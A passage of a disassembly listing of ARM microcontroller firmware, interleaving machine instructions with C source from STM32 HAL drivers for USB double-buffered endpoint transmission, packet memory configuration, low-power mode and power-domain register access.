 800353e:	667b      	str	r3, [r7, #100]	; 0x64
 8003540:	68bb      	ldr	r3, [r7, #8]
 8003542:	781b      	ldrb	r3, [r3, #0]
 8003544:	00da      	lsls	r2, r3, #3
 8003546:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8003548:	4413      	add	r3, r2
 800354a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800354e:	663b      	str	r3, [r7, #96]	; 0x60
 8003550:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 8003552:	2200      	movs	r2, #0
 8003554:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8003556:	68fb      	ldr	r3, [r7, #12]
 8003558:	681b      	ldr	r3, [r3, #0]
 800355a:	677b      	str	r3, [r7, #116]	; 0x74
 800355c:	68bb      	ldr	r3, [r7, #8]
 800355e:	785b      	ldrb	r3, [r3, #1]
 8003560:	2b00      	cmp	r3, #0
 8003562:	d12b      	bne.n	80035bc <HAL_PCD_EP_DB_Transmit+0x516>
 8003564:	68fb      	ldr	r3, [r7, #12]
 8003566:	681b      	ldr	r3, [r3, #0]
 8003568:	66fb      	str	r3, [r7, #108]	; 0x6c
 800356a:	68fb      	ldr	r3, [r7, #12]
 800356c:	681b      	ldr	r3, [r3, #0]
 800356e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003572:	b29b      	uxth	r3, r3
 8003574:	461a      	mov	r2, r3
 8003576:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 8003578:	4413      	add	r3, r2
 800357a:	66fb      	str	r3, [r7, #108]	; 0x6c
 800357c:	68bb      	ldr	r3, [r7, #8]
 800357e:	781b      	ldrb	r3, [r3, #0]
 8003580:	00da      	lsls	r2, r3, #3
 8003582:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 8003584:	4413      	add	r3, r2
 8003586:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800358a:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 800358e:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 8003592:	881b      	ldrh	r3, [r3, #0]
 8003594:	b29b      	uxth	r3, r3
 8003596:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800359a:	b29a      	uxth	r2, r3
 800359c:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80035a0:	801a      	strh	r2, [r3, #0]
 80035a2:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80035a6:	881b      	ldrh	r3, [r3, #0]
 80035a8:	b29b      	uxth	r3, r3
 80035aa:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80035ae:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80035b2:	b29a      	uxth	r2, r3
 80035b4:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80035b8:	801a      	strh	r2, [r3, #0]
 80035ba:	e017      	b.n	80035ec <HAL_PCD_EP_DB_Transmit+0x546>
 80035bc:	68bb      	ldr	r3, [r7, #8]
 80035be:	785b      	ldrb	r3, [r3, #1]
 80035c0:	2b01      	cmp	r3, #1
 80035c2:	d113      	bne.n	80035ec <HAL_PCD_EP_DB_Transmit+0x546>
 80035c4:	68fb      	ldr	r3, [r7, #12]
 80035c6:	681b      	ldr	r3, [r3, #0]
 80035c8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80035cc:	b29b      	uxth	r3, r3
 80035ce:	461a      	mov	r2, r3
 80035d0:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 80035d2:	4413      	add	r3, r2
 80035d4:	677b      	str	r3, [r7, #116]	; 0x74
 80035d6:	68bb      	ldr	r3, [r7, #8]
 80035d8:	781b      	ldrb	r3, [r3, #0]
 80035da:	00da      	lsls	r2, r3, #3
 80035dc:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 80035de:	4413      	add	r3, r2
 80035e0:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80035e4:	673b      	str	r3, [r7, #112]	; 0x70
 80035e6:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 80035e8:	2200      	movs	r2, #0
 80035ea:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 80035ec:	68bb      	ldr	r3, [r7, #8]
 80035ee:	781b      	ldrb	r3, [r3, #0]
 80035f0:	4619      	mov	r1, r3
 80035f2:	68f8      	ldr	r0, [r7, #12]
 80035f4:	f009 fa69 	bl	800caca <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 80035f8:	88fb      	ldrh	r3, [r7, #6]
 80035fa:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80035fe:	2b00      	cmp	r3, #0
 8003600:	f040 811a 	bne.w	8003838 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003604:	68fb      	ldr	r3, [r7, #12]
 8003606:	681b      	ldr	r3, [r3, #0]
 8003608:	461a      	mov	r2, r3
 800360a:	68bb      	ldr	r3, [r7, #8]
 800360c:	781b      	ldrb	r3, [r3, #0]
 800360e:	009b      	lsls	r3, r3, #2
 8003610:	4413      	add	r3, r2
 8003612:	881b      	ldrh	r3, [r3, #0]
 8003614:	b29b      	uxth	r3, r3
 8003616:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800361a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800361e:	f8a7 3088 	strh.w	r3, [r7, #136]	; 0x88
 8003622:	68fb      	ldr	r3, [r7, #12]
 8003624:	681b      	ldr	r3, [r3, #0]
 8003626:	461a      	mov	r2, r3
 8003628:	68bb      	ldr	r3, [r7, #8]
 800362a:	781b      	ldrb	r3, [r3, #0]
 800362c:	009b      	lsls	r3, r3, #2
 800362e:	441a      	add	r2, r3
 8003630:	f8b7 3088 	ldrh.w	r3, [r7, #136]	; 0x88
 8003634:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003638:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800363c:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003640:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003644:	b29b      	uxth	r3, r3
 8003646:	8013      	strh	r3, [r2, #0]
 8003648:	e0f6      	b.n	8003838 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 800364a:	88fb      	ldrh	r3, [r7, #6]
 800364c:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8003650:	2b00      	cmp	r3, #0
 8003652:	d121      	bne.n	8003698 <HAL_PCD_EP_DB_Transmit+0x5f2>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003654:	68fb      	ldr	r3, [r7, #12]
 8003656:	681b      	ldr	r3, [r3, #0]
 8003658:	461a      	mov	r2, r3
 800365a:	68bb      	ldr	r3, [r7, #8]
 800365c:	781b      	ldrb	r3, [r3, #0]
 800365e:	009b      	lsls	r3, r3, #2
 8003660:	4413      	add	r3, r2
 8003662:	881b      	ldrh	r3, [r3, #0]
 8003664:	b29b      	uxth	r3, r3
 8003666:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800366a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800366e:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 8003672:	68fb      	ldr	r3, [r7, #12]
 8003674:	681b      	ldr	r3, [r3, #0]
 8003676:	461a      	mov	r2, r3
 8003678:	68bb      	ldr	r3, [r7, #8]
 800367a:	781b      	ldrb	r3, [r3, #0]
 800367c:	009b      	lsls	r3, r3, #2
 800367e:	441a      	add	r2, r3
 8003680:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8003684:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003688:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800368c:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003690:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003694:	b29b      	uxth	r3, r3
 8003696:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 8003698:	68bb      	ldr	r3, [r7, #8]
 800369a:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 800369e:	2b01      	cmp	r3, #1
 80036a0:	f040 80ca 	bne.w	8003838 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 80036a4:	68bb      	ldr	r3, [r7, #8]
 80036a6:	695a      	ldr	r2, [r3, #20]
 80036a8:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80036ac:	441a      	add	r2, r3
 80036ae:	68bb      	ldr	r3, [r7, #8]
 80036b0:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 80036b2:	68bb      	ldr	r3, [r7, #8]
 80036b4:	69da      	ldr	r2, [r3, #28]
 80036b6:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80036ba:	441a      	add	r2, r3
 80036bc:	68bb      	ldr	r3, [r7, #8]
 80036be:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 80036c0:	68bb      	ldr	r3, [r7, #8]
 80036c2:	6a1a      	ldr	r2, [r3, #32]
 80036c4:	68bb      	ldr	r3, [r7, #8]
 80036c6:	691b      	ldr	r3, [r3, #16]
 80036c8:	429a      	cmp	r2, r3
 80036ca:	d30b      	bcc.n	80036e4 <HAL_PCD_EP_DB_Transmit+0x63e>
        {
          len = ep->maxpacket;
 80036cc:	68bb      	ldr	r3, [r7, #8]
 80036ce:	691b      	ldr	r3, [r3, #16]
 80036d0:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 80036d4:	68bb      	ldr	r3, [r7, #8]
 80036d6:	6a1a      	ldr	r2, [r3, #32]
 80036d8:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80036dc:	1ad2      	subs	r2, r2, r3
 80036de:	68bb      	ldr	r3, [r7, #8]
 80036e0:	621a      	str	r2, [r3, #32]
 80036e2:	e017      	b.n	8003714 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else if (ep->xfer_len_db == 0U)
 80036e4:	68bb      	ldr	r3, [r7, #8]
 80036e6:	6a1b      	ldr	r3, [r3, #32]
 80036e8:	2b00      	cmp	r3, #0
 80036ea:	d108      	bne.n	80036fe <HAL_PCD_EP_DB_Transmit+0x658>
        {
          len = TxPctSize;
 80036ec:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80036f0:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 80036f4:	68bb      	ldr	r3, [r7, #8]
 80036f6:	2200      	movs	r2, #0
 80036f8:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 80036fc:	e00a      	b.n	8003714 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else
        {
          len = ep->xfer_len_db;
 80036fe:	68bb      	ldr	r3, [r7, #8]
 8003700:	6a1b      	ldr	r3, [r3, #32]
 8003702:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 8003706:	68bb      	ldr	r3, [r7, #8]
 8003708:	2200      	movs	r2, #0
 800370a:	621a      	str	r2, [r3, #32]
          ep->xfer_fill_db = 0;
 800370c:	68bb      	ldr	r3, [r7, #8]
 800370e:	2200      	movs	r2, #0
 8003710:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
        }

        /* Set the Double buffer counter for pmabuffer1 */
        PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 8003714:	68fb      	ldr	r3, [r7, #12]
 8003716:	681b      	ldr	r3, [r3, #0]
 8003718:	657b      	str	r3, [r7, #84]	; 0x54
 800371a:	68bb      	ldr	r3, [r7, #8]
 800371c:	785b      	ldrb	r3, [r3, #1]
 800371e:	2b00      	cmp	r3, #0
 8003720:	d165      	bne.n	80037ee <HAL_PCD_EP_DB_Transmit+0x748>
 8003722:	68fb      	ldr	r3, [r7, #12]
 8003724:	681b      	ldr	r3, [r3, #0]
 8003726:	65fb      	str	r3, [r7, #92]	; 0x5c
 8003728:	68fb      	ldr	r3, [r7, #12]
 800372a:	681b      	ldr	r3, [r3, #0]
 800372c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003730:	b29b      	uxth	r3, r3
 8003732:	461a      	mov	r2, r3
 8003734:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8003736:	4413      	add	r3, r2
 8003738:	65fb      	str	r3, [r7, #92]	; 0x5c
 800373a:	68bb      	ldr	r3, [r7, #8]
 800373c:	781b      	ldrb	r3, [r3, #0]
 800373e:	00da      	lsls	r2, r3, #3
 8003740:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8003742:	4413      	add	r3, r2
 8003744:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003748:	65bb      	str	r3, [r7, #88]	; 0x58
 800374a:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800374c:	881b      	ldrh	r3, [r3, #0]
 800374e:	b29b      	uxth	r3, r3
 8003750:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003754:	b29a      	uxth	r2, r3
 8003756:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003758:	801a      	strh	r2, [r3, #0]
 800375a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800375e:	2b3e      	cmp	r3, #62	; 0x3e
 8003760:	d91d      	bls.n	800379e <HAL_PCD_EP_DB_Transmit+0x6f8>
 8003762:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003766:	095b      	lsrs	r3, r3, #5
 8003768:	66bb      	str	r3, [r7, #104]	; 0x68
 800376a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800376e:	f003 031f 	and.w	r3, r3, #31
 8003772:	2b00      	cmp	r3, #0
 8003774:	d102      	bne.n	800377c <HAL_PCD_EP_DB_Transmit+0x6d6>
 8003776:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003778:	3b01      	subs	r3, #1
 800377a:	66bb      	str	r3, [r7, #104]	; 0x68
 800377c:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800377e:	881b      	ldrh	r3, [r3, #0]
 8003780:	b29a      	uxth	r2, r3
 8003782:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003784:	b29b      	uxth	r3, r3
 8003786:	029b      	lsls	r3, r3, #10
 8003788:	b29b      	uxth	r3, r3
 800378a:	4313      	orrs	r3, r2
 800378c:	b29b      	uxth	r3, r3
 800378e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003792:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003796:	b29a      	uxth	r2, r3
 8003798:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800379a:	801a      	strh	r2, [r3, #0]
 800379c:	e041      	b.n	8003822 <HAL_PCD_EP_DB_Transmit+0x77c>
 800379e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80037a2:	2b00      	cmp	r3, #0
 80037a4:	d10a      	bne.n	80037bc <HAL_PCD_EP_DB_Transmit+0x716>
 80037a6:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80037a8:	881b      	ldrh	r3, [r3, #0]
 80037aa:	b29b      	uxth	r3, r3
 80037ac:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80037b0:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80037b4:	b29a      	uxth	r2, r3
 80037b6:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80037b8:	801a      	strh	r2, [r3, #0]
 80037ba:	e032      	b.n	8003822 <HAL_PCD_EP_DB_Transmit+0x77c>
 80037bc:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80037c0:	085b      	lsrs	r3, r3, #1
 80037c2:	66bb      	str	r3, [r7, #104]	; 0x68
 80037c4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80037c8:	f003 0301 	and.w	r3, r3, #1
 80037cc:	2b00      	cmp	r3, #0
 80037ce:	d002      	beq.n	80037d6 <HAL_PCD_EP_DB_Transmit+0x730>
 80037d0:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80037d2:	3301      	adds	r3, #1
 80037d4:	66bb      	str	r3, [r7, #104]	; 0x68
 80037d6:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80037d8:	881b      	ldrh	r3, [r3, #0]
 80037da:	b29a      	uxth	r2, r3
 80037dc:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80037de:	b29b      	uxth	r3, r3
 80037e0:	029b      	lsls	r3, r3, #10
 80037e2:	b29b      	uxth	r3, r3
 80037e4:	4313      	orrs	r3, r2
 80037e6:	b29a      	uxth	r2, r3
 80037e8:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80037ea:	801a      	strh	r2, [r3, #0]
 80037ec:	e019      	b.n	8003822 <HAL_PCD_EP_DB_Transmit+0x77c>
 80037ee:	68bb      	ldr	r3, [r7, #8]
 80037f0:	785b      	ldrb	r3, [r3, #1]
 80037f2:	2b01      	cmp	r3, #1
 80037f4:	d115      	bne.n	8003822 <HAL_PCD_EP_DB_Transmit+0x77c>
 80037f6:	68fb      	ldr	r3, [r7, #12]
 80037f8:	681b      	ldr	r3, [r3, #0]
 80037fa:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80037fe:	b29b      	uxth	r3, r3
 8003800:	461a      	mov	r2, r3
 8003802:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8003804:	4413      	add	r3, r2
 8003806:	657b      	str	r3, [r7, #84]	; 0x54
 8003808:	68bb      	ldr	r3, [r7, #8]
 800380a:	781b      	ldrb	r3, [r3, #0]
 800380c:	00da      	lsls	r2, r3, #3
 800380e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8003810:	4413      	add	r3, r2
 8003812:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003816:	653b      	str	r3, [r7, #80]	; 0x50
 8003818:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800381c:	b29a      	uxth	r2, r3
 800381e:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8003820:	801a      	strh	r2, [r3, #0]

        /* Copy the user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr1, (uint16_t)len);
 8003822:	68fb      	ldr	r3, [r7, #12]
 8003824:	6818      	ldr	r0, [r3, #0]
 8003826:	68bb      	ldr	r3, [r7, #8]
 8003828:	6959      	ldr	r1, [r3, #20]
 800382a:	68bb      	ldr	r3, [r7, #8]
 800382c:	895a      	ldrh	r2, [r3, #10]
 800382e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003832:	b29b      	uxth	r3, r3
 8003834:	f004 fee7 	bl	8008606 <USB_WritePMA>
      }
    }
  }

  /*enable endpoint IN*/
  PCD_SET_EP_TX_STATUS(hpcd->Instance, ep->num, USB_EP_TX_VALID);
 8003838:	68fb      	ldr	r3, [r7, #12]
 800383a:	681b      	ldr	r3, [r3, #0]
 800383c:	461a      	mov	r2, r3
 800383e:	68bb      	ldr	r3, [r7, #8]
 8003840:	781b      	ldrb	r3, [r3, #0]
 8003842:	009b      	lsls	r3, r3, #2
 8003844:	4413      	add	r3, r2
 8003846:	881b      	ldrh	r3, [r3, #0]
 8003848:	b29b      	uxth	r3, r3
 800384a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800384e:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8003852:	82bb      	strh	r3, [r7, #20]
 8003854:	8abb      	ldrh	r3, [r7, #20]
 8003856:	f083 0310 	eor.w	r3, r3, #16
 800385a:	82bb      	strh	r3, [r7, #20]
 800385c:	8abb      	ldrh	r3, [r7, #20]
 800385e:	f083 0320 	eor.w	r3, r3, #32
 8003862:	82bb      	strh	r3, [r7, #20]
 8003864:	68fb      	ldr	r3, [r7, #12]
 8003866:	681b      	ldr	r3, [r3, #0]
 8003868:	461a      	mov	r2, r3
 800386a:	68bb      	ldr	r3, [r7, #8]
 800386c:	781b      	ldrb	r3, [r3, #0]
 800386e:	009b      	lsls	r3, r3, #2
 8003870:	441a      	add	r2, r3
 8003872:	8abb      	ldrh	r3, [r7, #20]
 8003874:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003878:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800387c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8003880:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003884:	b29b      	uxth	r3, r3
 8003886:	8013      	strh	r3, [r2, #0]

  return HAL_OK;
 8003888:	2300      	movs	r3, #0
}
 800388a:	4618      	mov	r0, r3
 800388c:	3790      	adds	r7, #144	; 0x90
 800388e:	46bd      	mov	sp, r7
 8003890:	bd80      	pop	{r7, pc}

08003892 <HAL_PCDEx_PMAConfig>:
  * @retval HAL status
  */

HAL_StatusTypeDef  HAL_PCDEx_PMAConfig(PCD_HandleTypeDef *hpcd, uint16_t ep_addr,
                                       uint16_t ep_kind, uint32_t pmaadress)
{
 8003892:	b480      	push	{r7}
 8003894:	b087      	sub	sp, #28
 8003896:	af00      	add	r7, sp, #0
 8003898:	60f8      	str	r0, [r7, #12]
 800389a:	607b      	str	r3, [r7, #4]
 800389c:	460b      	mov	r3, r1
 800389e:	817b      	strh	r3, [r7, #10]
 80038a0:	4613      	mov	r3, r2
 80038a2:	813b      	strh	r3, [r7, #8]
  PCD_EPTypeDef *ep;

  /* initialize ep structure*/
  if ((0x80U & ep_addr) == 0x80U)
 80038a4:	897b      	ldrh	r3, [r7, #10]
 80038a6:	f003 0380 	and.w	r3, r3, #128	; 0x80
 80038aa:	b29b      	uxth	r3, r3
 80038ac:	2b00      	cmp	r3, #0
 80038ae:	d00b      	beq.n	80038c8 <HAL_PCDEx_PMAConfig+0x36>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80038b0:	897b      	ldrh	r3, [r7, #10]
 80038b2:	f003 0307 	and.w	r3, r3, #7
 80038b6:	1c5a      	adds	r2, r3, #1
 80038b8:	4613      	mov	r3, r2
 80038ba:	009b      	lsls	r3, r3, #2
 80038bc:	4413      	add	r3, r2
 80038be:	00db      	lsls	r3, r3, #3
 80038c0:	68fa      	ldr	r2, [r7, #12]
 80038c2:	4413      	add	r3, r2
 80038c4:	617b      	str	r3, [r7, #20]
 80038c6:	e009      	b.n	80038dc <HAL_PCDEx_PMAConfig+0x4a>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 80038c8:	897a      	ldrh	r2, [r7, #10]
 80038ca:	4613      	mov	r3, r2
 80038cc:	009b      	lsls	r3, r3, #2
 80038ce:	4413      	add	r3, r2
 80038d0:	00db      	lsls	r3, r3, #3
 80038d2:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80038d6:	68fa      	ldr	r2, [r7, #12]
 80038d8:	4413      	add	r3, r2
 80038da:	617b      	str	r3, [r7, #20]
  }

  /* Here we check if the endpoint is single or double Buffer*/
  if (ep_kind == PCD_SNG_BUF)
 80038dc:	893b      	ldrh	r3, [r7, #8]
 80038de:	2b00      	cmp	r3, #0
 80038e0:	d107      	bne.n	80038f2 <HAL_PCDEx_PMAConfig+0x60>
  {
    /* Single Buffer */
    ep->doublebuffer = 0U;
 80038e2:	697b      	ldr	r3, [r7, #20]
 80038e4:	2200      	movs	r2, #0
 80038e6:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaadress = (uint16_t)pmaadress;
 80038e8:	687b      	ldr	r3, [r7, #4]
 80038ea:	b29a      	uxth	r2, r3
 80038ec:	697b      	ldr	r3, [r7, #20]
 80038ee:	80da      	strh	r2, [r3, #6]
 80038f0:	e00b      	b.n	800390a <HAL_PCDEx_PMAConfig+0x78>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  else /* USB_DBL_BUF */
  {
    /* Double Buffer Endpoint */
    ep->doublebuffer = 1U;
 80038f2:	697b      	ldr	r3, [r7, #20]
 80038f4:	2201      	movs	r2, #1
 80038f6:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaaddr0 = (uint16_t)(pmaadress & 0xFFFFU);
 80038f8:	687b      	ldr	r3, [r7, #4]
 80038fa:	b29a      	uxth	r2, r3
 80038fc:	697b      	ldr	r3, [r7, #20]
 80038fe:	811a      	strh	r2, [r3, #8]
    ep->pmaaddr1 = (uint16_t)((pmaadress & 0xFFFF0000U) >> 16);
 8003900:	687b      	ldr	r3, [r7, #4]
 8003902:	0c1b      	lsrs	r3, r3, #16
 8003904:	b29a      	uxth	r2, r3
 8003906:	697b      	ldr	r3, [r7, #20]
 8003908:	815a      	strh	r2, [r3, #10]
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 800390a:	2300      	movs	r3, #0
}
 800390c:	4618      	mov	r0, r3
 800390e:	371c      	adds	r7, #28
 8003910:	46bd      	mov	sp, r7
 8003912:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003916:	4770      	bx	lr

08003918 <HAL_PCDEx_ActivateLPM>:
  * @brief  Activate LPM feature.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCDEx_ActivateLPM(PCD_HandleTypeDef *hpcd)
{
 8003918:	b480      	push	{r7}
 800391a:	b085      	sub	sp, #20
 800391c:	af00      	add	r7, sp, #0
 800391e:	6078      	str	r0, [r7, #4]

  USB_TypeDef *USBx = hpcd->Instance;
 8003920:	687b      	ldr	r3, [r7, #4]
 8003922:	681b      	ldr	r3, [r3, #0]
 8003924:	60fb      	str	r3, [r7, #12]
  hpcd->lpm_active = 1U;
 8003926:	687b      	ldr	r3, [r7, #4]
 8003928:	2201      	movs	r2, #1
 800392a:	f8c3 22ec 	str.w	r2, [r3, #748]	; 0x2ec
  hpcd->LPM_State = LPM_L0;
 800392e:	687b      	ldr	r3, [r7, #4]
 8003930:	2200      	movs	r2, #0
 8003932:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0

  USBx->LPMCSR |= USB_LPMCSR_LMPEN;
 8003936:	68fb      	ldr	r3, [r7, #12]
 8003938:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 800393c:	b29b      	uxth	r3, r3
 800393e:	f043 0301 	orr.w	r3, r3, #1
 8003942:	b29a      	uxth	r2, r3
 8003944:	68fb      	ldr	r3, [r7, #12]
 8003946:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54
  USBx->LPMCSR |= USB_LPMCSR_LPMACK;
 800394a:	68fb      	ldr	r3, [r7, #12]
 800394c:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 8003950:	b29b      	uxth	r3, r3
 8003952:	f043 0302 	orr.w	r3, r3, #2
 8003956:	b29a      	uxth	r2, r3
 8003958:	68fb      	ldr	r3, [r7, #12]
 800395a:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54

  return HAL_OK;
 800395e:	2300      	movs	r3, #0
}
 8003960:	4618      	mov	r0, r3
 8003962:	3714      	adds	r7, #20
 8003964:	46bd      	mov	sp, r7
 8003966:	f85d 7b04 	ldr.w	r7, [sp], #4
 800396a:	4770      	bx	lr

0800396c <HAL_PWR_EnableBkUpAccess>:
  * @note  LSEON bit that switches on and off the LSE crystal belongs as well to the
  *        back-up domain.
  * @retval None
  */
void HAL_PWR_EnableBkUpAccess(void)
{
 800396c:	b480      	push	{r7}
 800396e:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8003970:	4b05      	ldr	r3, [pc, #20]	; (8003988 <HAL_PWR_EnableBkUpAccess+0x1c>)
 8003972:	681b      	ldr	r3, [r3, #0]
 8003974:	4a04      	ldr	r2, [pc, #16]	; (8003988 <HAL_PWR_EnableBkUpAccess+0x1c>)
 8003976:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 800397a:	6013      	str	r3, [r2, #0]
}
 800397c:	bf00      	nop
 800397e:	46bd      	mov	sp, r7
 8003980:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003984:	4770      	bx	lr
 8003986:	bf00      	nop
 8003988:	40007000 	.word	0x40007000

0800398c <HAL_PWREx_GetVoltageRange>:
  * @brief Return Voltage Scaling Range.
  * @retval VOS bit field (PWR_REGULATOR_VOLTAGE_SCALE1 or PWR_REGULATOR_VOLTAGE_SCALE2
  *         or PWR_REGULATOR_VOLTAGE_SCALE1_BOOST when applicable)
  */
uint32_t HAL_PWREx_GetVoltageRange(void)
{
 800398c:	b480      	push	{r7}
 800398e:	af00      	add	r7, sp, #0
    else
    {
      return PWR_REGULATOR_VOLTAGE_SCALE1_BOOST;
    }
#else
  return  (PWR->CR1 & PWR_CR1_VOS);
 8003990:	4b04      	ldr	r3, [pc, #16]	; (80039a4 <HAL_PWREx_GetVoltageRange+0x18>)
 8003992:	681b      	ldr	r3, [r3, #0]
 8003994:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
#endif
